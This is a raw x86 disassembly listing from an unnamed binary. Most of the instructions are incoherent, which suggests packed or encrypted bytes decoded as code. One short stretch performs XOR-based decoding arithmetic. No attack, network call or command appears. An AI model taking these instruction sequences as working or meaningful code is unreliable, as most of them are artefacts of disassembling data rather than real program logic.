  4059d6:	popf   
  4059d7:	jg     0x4059d1
  4059d9:	jl     0x405a2d
  4059db:	mov    bl,0x45
  4059dd:	push   esp
  4059de:	dec    edx
  4059df:	mov    edi,0x9f2b5416
  4059e4:	inc    ecx
  4059e5:	std    
  4059e6:	cld    
  4059e7:	mov    ebx,0x581b1964
  4059ec:	out    dx,al
  4059ed:	dec    edi
  4059ee:	in     eax,dx
  4059ef:	xor    dl,BYTE PTR ds:0x621c795d
  4059f5:	adc    dh,ch
  4059f7:	or     ebx,ebx
  4059f9:	add    eax,0xef0ee640
  4059fe:	add    DWORD PTR [eax],ebp
  405a00:	out    0x6b,al
  405a02:	mov    dh,0x3e
  405a04:	sbb    al,0xef
  405a06:	lods   eax,DWORD PTR ds:[esi]
  405a07:	stos   BYTE PTR es:[edi],al
  405a08:	inc    edi
  405a09:	inc    ebp
  405a0a:	cwde   
  405a0b:	popf   
  405a0c:	(bad)  
  405a0e:	push   0x7e70f289
  405a13:	add    BYTE PTR [ebx-0x79],0x3e
  405a17:	test   BYTE PTR [ecx],0xef
  405a1a:	call   0x43fa:0xe40611bc
  405a21:	pop    ss
  405a22:	je     0x405a97
  405a24:	or     esp,DWORD PTR [ebx-0x60f2b4fe]
  405a2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a2b:	mov    DWORD PTR [edi],esp
  405a2d:	(bad)  
  405a2e:	xchg   edx,eax
  405a2f:	xchg   BYTE PTR [esi+0x501e4a11],cl
  405a35:	inc    esp
  405a36:	nop
  405a37:	cli    
  405a38:	inc    esi
  405a39:	sbb    cl,dh
  405a3b:	xchg   ecx,eax
  405a3c:	sub    bl,dh
  405a3e:	lods   al,BYTE PTR ds:[esi]
  405a3f:	icebp  
  405a40:	jle    0x405a02
  405a42:	imul   ecx,DWORD PTR [esi],0x28
  405a45:	cdq    
  405a46:	pop    ecx
  405a47:	xor    ebp,DWORD PTR [edi+edx*8+0x619d9842]
  405a4e:	mov    cx,dx
  405a51:	xor    al,0xda
  405a53:	fsubr  DWORD PTR [ebp+0x40]
  405a56:	adc    al,0x1b
  405a58:	mov    eax,ds:0x467b8804
  405a5d:	lods   al,BYTE PTR ds:[esi]
  405a5e:	adc    DWORD PTR [edx-0x316cb7a9],esp
  405a64:	pop    ebp
  405a65:	cmp    cl,BYTE PTR [edx]
  405a67:	stos   BYTE PTR es:[edi],al
  405a68:	(bad)  
  405a69:	xchg   ebx,eax
  405a6a:	scas   eax,DWORD PTR es:[edi]
  405a6b:	xlat   BYTE PTR ds:[ebx]
  405a6c:	xrelease xchg DWORD PTR [ebp-0x384de503],ebp
  405a73:	scas   al,BYTE PTR es:[edi]
  405a74:	mov    eax,0x77720cff
  405a79:	mov    dh,0xbd
  405a7b:	or     eax,0x8289c02f
  405a80:	mov    DWORD PTR [ebx+eax*8+0x30],edi
  405a84:	imul   ah
  405a86:	push   edi
  405a87:	lahf   
  405a88:	out    dx,al
  405a89:	mov    esi,0x2e8415e9
  405a8e:	xchg   esp,eax
  405a8f:	push   edi
  405a90:	test   al,0x2c
  405a92:	popa   
  405a93:	inc    ebx
  405a94:	pop    es
  405a95:	ins    DWORD PTR es:[edi],dx
  405a96:	push   0xa50ee259
  405a9b:	sub    eax,0xe84ebe17
  405aa0:	jp     0x405ac3
  405aa2:	test   al,0x82
  405aa4:	test   BYTE PTR [edi-0x73b96b28],dl
  405aaa:	inc    edi
  405aab:	xor    ebp,DWORD PTR [edi+0x15bb795d]
  405ab1:	mov    bl,0x14
  405ab3:	das    
  405ab4:	call   0xc3cb:0xc755572b
  405abb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405abc:	and    ebx,ebp
  405abe:	pop    edx
  405abf:	add    BYTE PTR [ebx],al
  405ac1:	pop    esp
  405ac2:	test   al,0x9d
  405ac4:	mov    ah,0x97
  405ac6:	dec    ecx
  405ac7:	jecxz  0x405aff
  405ac9:	popa   
  405aca:	jecxz  0x405a8c
  405acc:	inc    edx
  405acd:	mov    eax,ds:0xda1f9e76
  405ad2:	imul   edx,DWORD PTR [ebp+0x65],0xffffffcb
  405ad6:	retf   0x9349
  405ad9:	dec    edx
  405ada:	pop    ebx
  405adb:	out    0x9,eax
  405add:	pop    ebp
  405ade:	inc    eax
  405adf:	push   es
  405ae0:	dec    esi
  405ae1:	jecxz  0x405ab9
  405ae3:	and    DWORD PTR [edx-0x6d3dd0fd],edx
  405ae9:	fist   DWORD PTR [ebp+0x31aff176]
  405aef:	cmp    edi,0x5bf5f602
  405af5:	jg     0x405aa9
  405af7:	cdq    
  405af8:	xchg   edi,eax
  405af9:	mov    eax,ds:0x354e1990
  405afe:	lods   al,BYTE PTR ds:[esi]
  405aff:	mov    eax,ds:0xe9c736f1
  405b04:	(bad)  
  405b06:	jmp    0x405aba
  405b08:	or     eax,0x8b44cec3
  405b0d:	inc    esi
  405b0e:	mov    edi,0xb35a439f
  405b13:	retf   
  405b14:	(bad)  
  405b15:	sbb    DWORD PTR [edx],ebx
  405b17:	loop   0x405b0f
  405b19:	adc    ecx,eax
  405b1b:	adc    DWORD PTR [ecx-0x5a],eax
  405b1e:	pushf  
  405b1f:	mov    cl,0x2a
  405b21:	add    DWORD PTR [edi-0x5cf6d5d7],ecx
  405b27:	nop
  405b28:	daa    
  405b29:	mov    ah,0x41
  405b2b:	mov    dh,0x52
  405b2d:	out    0xfb,al
  405b2f:	xor    DWORD PTR [ebp+0x3c98d732],0xb5337084
  405b39:	cmc    
  405b3a:	push   0x9e6a2cd6
  405b3f:	xor    BYTE PTR [esi-0x63],dl
  405b42:	xor    esi,DWORD PTR [edx+0x623a12a3]
  405b48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405b49:	adc    ah,BYTE PTR [edi+0x57cb665a]
  405b4f:	popf   
  405b50:	js     0x405afc
  405b52:	pusha  
  405b53:	imul   eax,DWORD PTR [eax+0x2507a5fd],0xffffffe8
  405b5a:	sub    DWORD PTR [edx+0x4a],ebp
  405b5d:	call   0x9202bfd0
  405b62:	(bad)  [edi-0x359b55a7]
  405b68:	and    BYTE PTR [edi],bh
  405b6a:	sbb    BYTE PTR [edx+eax*1+0x7d],dl
  405b6e:	fsub   QWORD PTR [esi+0x5]
  405b71:	push   ss
  405b72:	fwait
  405b73:	outs   dx,BYTE PTR ds:[esi]
  405b74:	mov    ebp,0x90b3e477
  405b79:	and    al,0x30
  405b7b:	shr    BYTE PTR [ebx-0x2d],1
  405b7e:	adc    al,0xb7
  405b80:	inc    esi
  405b81:	dec    ebp
  405b82:	aad    0x95
  405b84:	jb     0x405b48
  405b86:	paddw  mm1,QWORD PTR [ecx+0x53d80512]
  405b8d:	add    BYTE PTR [edi+eiz*8],dl
  405b90:	test   BYTE PTR [edi+edx*4+0x21],0x5
  405b95:	pop    ss
  405b96:	mov    BYTE PTR [edi-0x2f],cl
  405b99:	les    esp,FWORD PTR [ecx+0x257e9b47]
  405b9f:	jb     0x405b48
  405ba1:	test   al,0x8a
  405ba3:	xor    ecx,DWORD PTR [ebx]
  405ba5:	data16 sbb ch,BYTE PTR [ebx-0x9]
  405ba9:	inc    edi
  405baa:	xchg   ecx,eax
  405bab:	mov    gs,WORD PTR [ebx-0x67c81462]
  405bb1:	adc    BYTE PTR [ecx+0x59],cl
  405bb4:	or     eax,0x8bda8b31
  405bb9:	sub    BYTE PTR [edx-0x6c795cae],bh
  405bbf:	jle    0x405bdd
  405bc1:	pop    ds
  405bc2:	or     eax,0x98bbef52
  405bc7:	pop    ebp
  405bc8:	push   ss
  405bc9:	repz and bl,ch
  405bcc:	in     eax,dx
  405bcd:	scas   eax,DWORD PTR es:[edi]
  405bce:	add    BYTE PTR [edx+0x34],0x9
  405bd2:	imul   ecx,edi,0x7365fc6d
  405bd8:	mul    DWORD PTR [esi-0x59f5fc4f]
  405bde:	mov    al,0x64
  405be0:	fcomp  DWORD PTR [ebx]
  405be2:	ins    DWORD PTR es:[edi],dx
  405be3:	not    BYTE PTR [edx+0x25]
  405be6:	cmp    eax,0x505da9d9
  405beb:	dec    ebp
  405bec:	je     0x405c0f
  405bee:	nop
  405bef:	or     eax,0x7a906ae9
  405bf4:	lods   al,BYTE PTR ds:[esi]
  405bf5:	aas    
  405bf6:	cmc    
  405bf7:	les    ebx,FWORD PTR ds:0x232e97e2
  405bfd:	sub    edx,DWORD PTR [edi+0x6e]
  405c00:	mov    bh,0x30
  405c02:	xchg   BYTE PTR [edi+0x19c10b29],al
  405c08:	push   0x16
  405c0a:	push   eax
  405c0b:	or     eax,0x388bbb06
  405c10:	mov    ah,0x9d
  405c12:	(bad)  
  405c13:	leave  
  405c14:	adc    DWORD PTR [ebp+0x3d],eax
  405c17:	dec    edx
  405c18:	fwait
  405c19:	test   eax,0x19edb475
  405c1e:	cld    
  405c1f:	lahf   
  405c20:	dec    ebp
  405c21:	xor    al,0x52
  405c23:	mov    al,ds:0x3d79b135
  405c28:	push   ecx
  405c29:	dec    ebp
  405c2a:	imul   ebp,DWORD PTR ds:0xb425e21c,0x1a
  405c31:	js     0x405cb0
  405c33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c34:	pop    ebx
  405c35:	jecxz  0x405c6a
  405c37:	adc    al,bl
  405c39:	dec    ebx
  405c3a:	repnz dec edi
  405c3c:	ficom  DWORD PTR [ebx+0x2775ca37]
  405c42:	dec    esp
  405c43:	push   edx
  405c44:	add    BYTE PTR [edx+0x3c],cl
  405c47:	test   al,0xec
  405c49:	cdq    
  405c4a:	mov    al,0xbb
  405c4c:	leave  
  405c4d:	and    BYTE PTR [ecx+0x1f0d45f3],cl
  405c53:	std    
  405c54:	(bad)  
  405c55:	gs jb  0x405c96
  405c58:	jle    0x405c15
  405c5a:	jae    0x405c03
  405c5c:	lahf   
  405c5d:	nop
  405c5e:	jg     0x405caf
  405c60:	add    BYTE PTR [esi-0x361be7f6],ch
  405c66:	xchg   esp,eax
  405c67:	jnp    0x405c42
  405c69:	jmp    0x405cb2
  405c6b:	ret    0xb5b4
  405c6e:	mov    esi,0x412de076
  405c73:	les    esi,FWORD PTR [esi]
  405c75:	mov    al,ds:0xfb21af09
  405c7a:	cmp    BYTE PTR [edx+edi*4-0x5a],bl
  405c7e:	cdq    
  405c7f:	mov    ds:0x788e5214,al
  405c84:	xor    BYTE PTR [edi-0x726fe37c],ah
  405c8a:	(bad)  
  405c8b:	addr16 (bad) 
  405c8d:	fsub   QWORD PTR [ebx]
  405c8f:	push   cs
  405c90:	fisttp DWORD PTR [edx+0x551cd1b0]
  405c96:	cmp    al,0x3
  405c98:	ss mov ch,0x39
  405c9b:	into   
  405c9c:	or     esp,esp
  405c9e:	ja     0x405cdc
  405ca0:	imul   esp,DWORD PTR [edx-0xdbdc902],0x37
  405ca7:	jae    0x405ce9
  405ca9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405caa:	fisub  DWORD PTR [eax-0x68]
  405cad:	sub    edx,DWORD PTR [edx-0x11]
  405cb0:	dec    DWORD PTR [ebx+0x68]
  405cb3:	jp     0x405c5e
  405cb5:	mov    ecx,eax
  405cb7:	push   eax
  405cb8:	jb     0x405c61
  405cba:	mov    dl,0xb3
  405cbc:	aaa    
  405cbd:	pop    edi
  405cbe:	push   edx
  405cbf:	ja     0x405d22
  405cc1:	dec    esi
  405cc2:	ins    BYTE PTR es:[edi],dx
  405cc3:	daa    
  405cc4:	inc    eax
  405cc5:	ror    edx,cl
  405cc7:	and    DWORD PTR [ebx],0xffffffee
  405cca:	outs   dx,DWORD PTR ds:[esi]
  405ccb:	jae    0x405d37
  405ccd:	jnp    0x405d31
  405ccf:	bound  esi,QWORD PTR [esi-0x5e]
  405cd2:	mul    BYTE PTR [edx]
  405cd4:	push   0x1b88acc7
  405cd9:	and    ecx,DWORD PTR [ebx]
  405cdb:	xor    BYTE PTR [edi-0x69653444],al
  405ce1:	(bad)  
  405ce2:	mov    ebx,0x76c2ce
  405ce7:	push   ss
  405ce8:	test   dl,0xa9
  405ceb:	jl     0x405c97
  405ced:	cwde   
  405cee:	aas    
  405cef:	ins    BYTE PTR es:[edi],dx
  405cf0:	sahf   
  405cf1:	xchg   DWORD PTR cs:[esi-0x1c],ebp
  405cf5:	bound  esp,QWORD PTR [ebx+0x47]
  405cf8:	mov    cl,0x5f
  405cfa:	call   0xd686:0xf1be5fea
  405d01:	xor    eax,0xc2b30bb1
  405d06:	inc    ebp
  405d07:	ror    BYTE PTR [edi+ebx*1-0x1e8a4fad],cl
  405d0e:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  405d10:	ins    BYTE PTR es:[edi],dx
  405d11:	sub    bh,BYTE PTR [edx+ebx*8]
  405d14:	mov    WORD PTR fs:[eax],ss
  405d17:	push   DWORD PTR [ebx-0x7e]
  405d1a:	push   esp
  405d1b:	cmp    BYTE PTR [ecx+ecx*8+0x78163938],ch
  405d22:	mov    eax,ds:0xb191da87
  405d27:	fmul   st,st(4)
  405d29:	out    dx,eax
  405d2a:	ret    
  405d2b:	stos   DWORD PTR es:[edi],eax
  405d2c:	fcmovnb st,st(4)
  405d2e:	popf   
  405d2f:	cmp    al,0x14
  405d31:	pop    edi
  405d32:	jl     0x405d50
  405d34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d35:	outs   dx,BYTE PTR ds:[esi]
  405d36:	jo     0x405db2
  405d38:	fwait
  405d39:	out    0xb8,al
  405d3b:	pop    ebp
  405d3c:	push   0xffffff92
  405d3e:	or     edi,edx
  405d40:	aaa    
  405d41:	dec    esi
  405d42:	ins    BYTE PTR es:[edi],dx
  405d43:	arpl   WORD PTR [ebx+0x6c2aa6cd],si
  405d49:	sub    eax,0xcecc999
  405d4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d4f:	push   0x708e3158
  405d54:	pop    es
  405d55:	jecxz  0x405d36
  405d57:	or     al,0xe5
  405d59:	sub    DWORD PTR [edi-0x67],eax
  405d5c:	test   al,0xdb
  405d5e:	test   DWORD PTR [eax-0x2ce3fb3d],esi
  405d64:	fistp  DWORD PTR [edx]
  405d66:	and    BYTE PTR [edx+0x34a3ea4e],cl
  405d6c:	inc    edx
  405d6d:	xchg   edx,eax
  405d6e:	push   es
  405d6f:	adc    BYTE PTR [edx+0xdd55a48],dl
  405d75:	mov    ebx,0x2eb277a8
  405d7a:	loopne 0x405ddd
  405d7c:	cmp    DWORD PTR [eax],esi
  405d7e:	adc    al,0xd9
  405d80:	jb     0x405db0
  405d82:	jae    0x405d48
  405d84:	jle    0x405de6
  405d86:	(bad)  
  405d87:	loop   0x405d11
  405d89:	jmp    0xcd5a:0x40978bb2
  405d90:	push   es
  405d91:	stc    
  405d92:	pop    edi
  405d93:	jo     0x405d88
  405d95:	jg     0x405e06
  405d97:	rcr    DWORD PTR [ebx+0x44],1
  405d9a:	sbb    al,0x49
  405d9c:	cmp    ah,BYTE PTR [ebp+ebp*8-0xa]
  405da0:	es in  al,0x2d
  405da3:	out    dx,eax
  405da4:	add    eax,0x1eaf4516
  405da9:	pusha  
  405daa:	jb     0x405d65
  405dac:	into   
  405dad:	dec    edx
  405dae:	fld    DWORD PTR [edx+0x1]
  405db1:	jns    0x405d44
  405db3:	(bad)  
  405db4:	pop    ebx
  405db5:	or     al,0x7
  405db7:	or     eax,0x5e56abfe
  405dbc:	push   cs
  405dbd:	add    dh,BYTE PTR [ecx]
  405dbf:	(bad)  
  405dc0:	cmp    bh,al
  405dc2:	(bad)  [ecx]
  405dc4:	mov    ds:0xc4f9590b,eax
  405dc9:	dec    esi
  405dca:	jo     0x405d74
  405dcc:	aas    
  405dcd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405dce:	mov    esi,0x7e95478
  405dd3:	jp     0x405d9d
  405dd5:	push   0xf
  405dd7:	dec    ebx
  405dd8:	lods   eax,DWORD PTR ds:[esi]
  405dd9:	test   al,0x6b
  405ddb:	stos   DWORD PTR es:[edi],eax
  405ddc:	adc    eax,0x6982b26b
  405de1:	push   0x6c07573b
  405de6:	in     eax,0x74
  405de8:	loopne 0x405e0f
  405dea:	popf   
  405deb:	lahf   
  405dec:	jbe    0x405e4c
  405dee:	popf   
  405def:	hlt    
  405df0:	pop    esp
  405df1:	call   0xf02663af
  405df6:	(bad)  
  405df7:	xchg   ecx,eax
  405df8:	pop    eax
  405df9:	dec    edi
  405dfa:	push   ebp
  405dfb:	or     DWORD PTR [esi*1-0x6457eefc],edi
  405e02:	mov    ah,BYTE PTR [ecx+0x1e]
  405e05:	mov    al,ds:0x3183f897
  405e0a:	jb     0x405da5
  405e0c:	out    0xfc,eax
  405e0e:	ror    DWORD PTR [ebx+0x3b3ca109],0xef
  405e15:	adc    DWORD PTR [edx],ecx
  405e17:	mov    eax,DWORD PTR [ebx+0x1d45e3ca]
  405e1d:	xor    ah,BYTE PTR [edx-0x6021fcff]
  405e23:	fsub   st,st(4)
  405e25:	lea    edx,[ecx]
  405e27:	inc    ebx
  405e28:	stc    
  405e29:	dec    edi
  405e2a:	xchg   edi,eax
  405e2b:	cmc    
  405e2c:	xor    eax,0x90cd4514
  405e31:	out    dx,eax
  405e32:	inc    esp
  405e33:	das    
  405e34:	push   esp
  405e35:	add    BYTE PTR [eax-0x11],bl
  405e38:	push   esp
  405e39:	cmp    bl,ah
  405e3b:	fstp   QWORD PTR [ecx+esi*4-0x6b]
  405e3f:	xor    ebx,ebp
  405e41:	icebp  
  405e42:	xchg   ebx,eax
  405e43:	(bad)  
  405e44:	aad    0xad
  405e46:	push   eax
  405e47:	push   edx
  405e48:	fidiv  WORD PTR [eax-0x34527b8b]
  405e4e:	lock fbld TBYTE PTR [ecx+edx*1-0x4]
  405e53:	in     al,dx
  405e54:	xor    DWORD PTR [eax],0x14
  405e57:	sbb    BYTE PTR [ebp-0x346304a2],al
  405e5d:	sub    al,0xd8
  405e5f:	xor    al,0x2d
  405e61:	(bad)
  405e64:	enter  0x3b93,0x6e
  405e68:	cmp    esp,ebp
  405e6a:	punpcklbw mm4,DWORD PTR [edx+0x6d9d9187]
  405e71:	xor    ah,BYTE PTR [ebp+edx*8+0x17]
  405e75:	sub    al,0x79
  405e77:	call   0x20120c41
  405e7c:	jne    0x405eb6
  405e7e:	and    ah,BYTE PTR [esp+edx*8+0x23]
  405e82:	out    0xf6,eax
  405e84:	sub    al,0x85
  405e86:	sub    esp,DWORD PTR [edi+ebx*1+0x25781124]
  405e8d:	push   esp
  405e8e:	sbb    DWORD PTR [edi+eax*4+0x5],eax
  405e92:	sub    esi,DWORD PTR [eax+0x70]
  405e95:	(bad)  [esi*8-0x3bbc363c]
  405e9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e9d:	xor    al,0x54
  405e9f:	push   edi
  405ea0:	xchg   esp,eax
  405ea1:	popa   
  405ea2:	dec    edx
  405ea3:	fdivr  QWORD PTR [ecx-0x4e0a11f]
  405ea9:	inc    edi
  405eaa:	loopne 0x405f0e
  405eac:	les    eax,FWORD PTR [ebp-0x41a33d45]
  405eb2:	(bad)  
  405eb4:	mov    dh,al
  405eb6:	cmovp  eax,DWORD PTR [esp+edx*8+0x1007f5db]
  405ebe:	and    ebx,DWORD PTR [eax+0x38d88f30]
  405ec4:	xor    eax,DWORD PTR [ecx-0x78]
  405ec7:	sar    DWORD PTR [ecx+0x3a],cl
  405eca:	and    BYTE PTR [eax],bl
  405ecc:	sub    eax,0x5ea06c30
  405ed1:	mov    ?,eax
  405ed3:	mov    ecx,0x428a9894
  405ed8:	and    al,BYTE PTR [edx+0x704a25d4]
  405ede:	lods   eax,DWORD PTR ds:[esi]
  405edf:	mov    ch,0xb4
  405ee1:	lahf   
  405ee2:	lahf   
  405ee3:	jmp    0x405e85
  405ee5:	xchg   esp,eax
  405ee6:	outs   dx,DWORD PTR ds:[esi]
  405ee7:	std    
  405ee8:	out    0x14,al
  405eea:	inc    ebx
  405eeb:	xor    edx,DWORD PTR [esi]
  405eed:	adc    ebx,edx
  405eef:	nop
  405ef0:	(bad)  
  405ef1:	in     eax,dx
  405ef2:	pop    ds
  405ef3:	sub    ecx,eax
  405ef5:	xchg   ecx,eax
  405ef6:	jg     0x405f54
  405ef8:	xor    esp,esi
  405efa:	std    
  405efb:	add    eax,0x34fa17d9
  405f00:	xor    ch,dh
  405f02:	loopne 0x405f13
  405f04:	lock sbb eax,DWORD PTR [esi+0x5a6b9389]
  405f0b:	adc    esi,DWORD PTR [eax-0x734b96fd]
  405f11:	or     ch,dl
  405f13:	xchg   DWORD PTR [ebx],ebx
  405f15:	retf   
  405f16:	ficomp DWORD PTR [bp+si]
  405f19:	inc    edx
  405f1a:	fwait
  405f1b:	jge    0x405eb1
  405f1d:	xor    eax,0xf494d62c
  405f22:	cmp    al,0xfa
  405f24:	test   DWORD PTR [edx+0x48c07b1e],eax
  405f2a:	mov    dl,0xa9
  405f2c:	jns    0x405f2a
  405f2e:	outs   dx,DWORD PTR ds:[esi]
  405f2f:	fwait
  405f30:	rol    DWORD PTR [esi-0x204fa324],cl
  405f36:	hlt    
  405f37:	sub    BYTE PTR [ebx],0x9c
  405f3a:	nop
  405f3b:	(bad)  
  405f3c:	push   ebx
  405f3d:	sbb    esp,DWORD PTR [eax]
  405f3f:	test   esi,edx
  405f41:	out    0x6b,al
  405f43:	jno    0x405ec6
  405f45:	aas    
  405f46:	jno    0x405f99
  405f48:	popa   
  405f49:	push   ss
  405f4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f4b:	popf   
  405f4c:	mov    eax,0x96a15242
  405f51:	inc    edx
  405f52:	scas   al,BYTE PTR es:[edi]
  405f53:	inc    ebp
  405f54:	scas   al,BYTE PTR es:[edi]
  405f55:	xchg   edx,eax
  405f56:	outs   dx,BYTE PTR ds:[esi]
  405f57:	mov    ds:0x93f4853f,al
  405f5c:	pop    edi
  405f5d:	leave  
  405f5e:	lods   al,BYTE PTR ds:[esi]
  405f5f:	xor    al,0xf2
  405f61:	pop    ecx
  405f62:	sub    cl,ch
  405f64:	push   ebx
  405f65:	loop   0x405f2a
  405f67:	add    eax,0x1817ca1e
  405f6c:	ror    dh,1
  405f6e:	push   eax
  405f6f:	inc    edx
  405f70:	mov    edx,DWORD PTR [ebx]
  405f72:	shl    DWORD PTR [ebx+0x21],1
  405f75:	data16 mov bl,0xba
  405f78:	repz lock push edx
  405f7b:	fnstcw WORD PTR [ebp+0x3d9450a2]
  405f81:	fdiv   QWORD PTR [ebp+edi*2+0x2819866e]
  405f88:	cld    
  405f89:	jecxz  0x406000
  405f8b:	or     al,0xd9
  405f8d:	sub    al,0xd7
  405f8f:	mov    ds:0x3f4fc7e4,eax
  405f94:	ins    BYTE PTR es:[edi],dx
  405f95:	imul   ecx,DWORD PTR [esi],0x1751cecf
  405f9b:	xchg   BYTE PTR [edi+0x224d3107],al
  405fa1:	ror    edx,0x33
  405fa4:	fnstenv [edx-0x43cbc3b9]
  405faa:	sub    BYTE PTR [ecx+0x5],bh
  405fad:	out    dx,al
  405fae:	bound  eax,QWORD PTR [edx-0x2db9106a]
  405fb4:	xchg   ecx,eax
  405fb5:	push   0x19
  405fb7:	pop    ds
  405fb8:	sub    al,0x27
  405fba:	(bad)  
  405fbb:	cmp    eax,0x6cc9337a
  405fc0:	in     eax,0x78
  405fc2:	or     ebx,DWORD PTR [edx-0x138ec0a2]
  405fc8:	cmp    bh,ah
  405fca:	or     DWORD PTR [edi+edi*8+0x27d49de1],ecx
  405fd1:	jmp    0x405fe4
  405fd3:	jmp    0x2fe5:0x6cc3118a
  405fda:	in     eax,0x29
  405fdc:	jo     0x405ff9
  405fde:	loope  0x406012
  405fe0:	mov    edx,0xc546b464
  405fe5:	mov    BYTE PTR [ebx+edx*4],ah
  405fe8:	xchg   esi,eax
  405fe9:	dec    edi
  405fea:	jmp    0x1ad56033
  405fef:	and    eax,0x8ac7ace7
  405ff4:	stc    
  405ff5:	sub    eax,0x7f959569
  405ffa:	pop    edx
  405ffb:	jle    0x405faa
  405ffd:	cmp    al,0x5a
  405fff:	icebp  
  406000:	add    BYTE PTR [edi+0x6c8a357],0x8f
  406007:	into   
  406008:	ds jle 0x406037
  40600b:	push   0x626d41f7
  406010:	mov    bh,0x45
  406012:	out    0xe4,eax
  406014:	dec    ebx
  406015:	mov    ch,0x37
  406017:	hlt    
  406018:	jmp    0xf3488f56
  40601d:	mov    WORD PTR [ecx],?
  40601f:	jge    0x406020
  406021:	out    dx,al
  406022:	mov    ebx,0xd2188922
  406027:	repnz xchg esi,eax
  406029:	(bad)  
  40602a:	ja     0x405fcd
  40602c:	jle    0x405ff9
  40602e:	jno    0x40605c
  406030:	jbe    0x406099
  406032:	fbld   TBYTE PTR [ecx+edi*4+0x6f]
  406036:	into   
  406037:	mov    ah,0xfb
  406039:	and    ecx,DWORD PTR [ebx]
  40603b:	jno    0x4060b2
  40603d:	(bad)  
  40603e:	enter  0x5cf5,0xc7
  406042:	jb     0x405fff
  406044:	aas    
  406045:	and    al,0xab
  406047:	mov    WORD PTR [edi],cs
  406049:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40604a:	jns    0x40608b
  40604c:	xor    BYTE PTR [ecx+0x23],dl
  40604f:	enter  0x19fa,0xad
  406053:	out    dx,al
  406054:	out    0xd,eax
  406056:	and    ecx,edx
  406058:	arpl   di,dx
  40605a:	fcom   QWORD PTR [esi+ebp*1+0x504bc68d]
  406061:	ror    ebp,1
  406063:	gs pop eax
  406065:	loop   0x4060e1
  406067:	push   eax
  406068:	xor    al,0x9
  40606a:	sub    eax,0x9fad429
  40606f:	pop    esp
  406070:	ss inc ebx
  406072:	xor    eax,0xb9fcb156
  406077:	addr16 imul esi,ebx,0x4e
  40607b:	add    edx,DWORD PTR [edi+0x40]
  40607e:	cmp    BYTE PTR [ebx-0x3e],dl
  406081:	popf   
  406082:	mov    ecx,0xc133088
  406087:	loop   0x406060
  406089:	stos   BYTE PTR es:[edi],al
  40608a:	aam    0x86
  40608c:	inc    ecx
  40608d:	dec    esi
  40608e:	dec    ecx
  40608f:	cmp    BYTE PTR [edi-0x2],ch
  406092:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406093:	sbb    bl,bl
  406095:	mov    bl,BYTE PTR [eax-0x37]
  406098:	cmp    eax,0x1f0ab515
  40609d:	pushf  
  40609e:	or     edi,DWORD PTR [eax]
  4060a0:	jmp    0x6621743b
  4060a5:	js     0x406064
  4060a7:	xor    ch,BYTE PTR [ebx+0x6697789c]
  4060ad:	adc    eax,0xc43e1a27
  4060b2:	push   es
  4060b3:	xor    edx,DWORD PTR [ecx+0x2fbff6ed]
  4060b9:	dec    esp
  4060ba:	dec    eax
  4060bb:	adc    cl,BYTE PTR [esi+0x77c909ce]
  4060c1:	in     al,0x86
  4060c3:	or     al,0xf6
  4060c5:	test   al,0x27
  4060c7:	push   cs
  4060c8:	mov    al,0x8c
  4060ca:	mov    edx,DWORD PTR [ebp-0xc]
  4060cd:	xor    eax,esi
  4060cf:	add    eax,edi
  4060d1:	imul   eax,edx
  4060d4:	mov    edx,DWORD PTR [ebp-0x28]
  4060d7:	xor    edx,esi
  4060d9:	add    eax,edx
  4060db:	mov    edx,DWORD PTR [ebp-0x8]
  4060de:	movzx  eax,BYTE PTR [eax+edx*1+0x3272f8]
  4060e6:	mov    edx,DWORD PTR [ebp-0x50]
  4060e9:	xor    edx,esi
  4060eb:	lea    eax,[edx+eax*1+0x3272f8]
  4060f2:	movzx  edx,BYTE PTR [ebp-0x1]
  4060f6:	xor    edx,eax
  4060f8:	mov    BYTE PTR [ebp-0x1],dl
  4060fb:	mov    al,BYTE PTR [ebp-0x1]
  4060fe:	mov    edx,DWORD PTR [ebp-0x30]
  406101:	mov    ebx,DWORD PTR [ebp-0xc]
  406104:	xor    edx,esi
  406106:	add    edx,edi
  406108:	imul   edx,ebx
  40610b:	jmp    0x408462
  406110:	add    eax,edx
  406112:	test   BYTE PTR [esi+edx*2],al
  406115:	pop    eax
  406116:	add    edx,ebx
  406118:	push   edx
  406119:	popf   
  40611a:	and    dl,bh
  40611c:	sbb    DWORD PTR [ecx-0x3e10edbc],edx
  406122:	jnp    0x40619f
  406124:	mov    ch,0x9e
  406126:	jnp    0x4061a3
  406128:	mov    ch,0xc7
  40612a:	mov    ch,0xba
  40612c:	add    al,0x46
  40612e:	add    dl,BYTE PTR [ebx+0x4a]
  406131:	ret    
  406132:	jnp    0x4060d1
  406134:	pop    ecx
  406135:	and    BYTE PTR [ebp-0x76a1598c],dh
  40613b:	sti    
  40613c:	or     dh,BYTE PTR [ebx-0x66]
  40613f:	stos   BYTE PTR es:[edi],al
  406140:	rcl    BYTE PTR [ebx],0xbd
  406143:	sbb    cl,BYTE PTR [esi-0x21463bfa]
  406149:	cld    
  40614a:	je     0x40618b
  40614c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40614d:	je     0x406101
  40614f:	and    al,0x4
  406151:	pop    edx
  406152:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406153:	popf   
  406154:	mov    bh,0x93
  406156:	in     eax,0xf7
  406158:	fbstp  TBYTE PTR [ebx+esi*8+0x51]
  40615c:	fmul   st(6),st
  40615e:	or     al,0x73
  406160:	es xchg esp,eax
  406162:	xor    bl,cl
  406164:	mov    ds:0xfe78f4e7,al
  406169:	rcl    DWORD PTR ds:0x1bab6595,1
  40616f:	(bad)  
  406170:	iret   
  406171:	ins    DWORD PTR es:[edi],dx
  406172:	lahf   
  406173:	arpl   cx,bp
  406175:	cmove  ebx,DWORD PTR [esi]
  406178:	xchg   ebx,eax
  406179:	aad    0xa5
  40617b:	data16 loop 0x40612e
  40617e:	cdq    
